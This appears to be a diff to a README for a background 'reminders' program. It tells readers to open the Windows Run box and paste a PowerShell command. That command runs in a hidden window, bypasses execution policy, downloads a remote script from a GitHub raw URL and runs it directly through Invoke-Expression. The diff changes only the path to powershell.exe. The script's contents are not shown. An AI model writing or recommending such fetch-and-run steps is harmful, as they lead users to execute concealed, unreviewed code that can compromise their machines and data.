@@ -7,7 +7,7 @@ No installation or prerequisites are needed. The program runs in the background.
 Press **Win + R**, paste the command below, and press Enter:
 
 ```
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminders.ps1 | iex"
+%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminders.ps1 | iex"
 ```
 
 ## Disclaimer
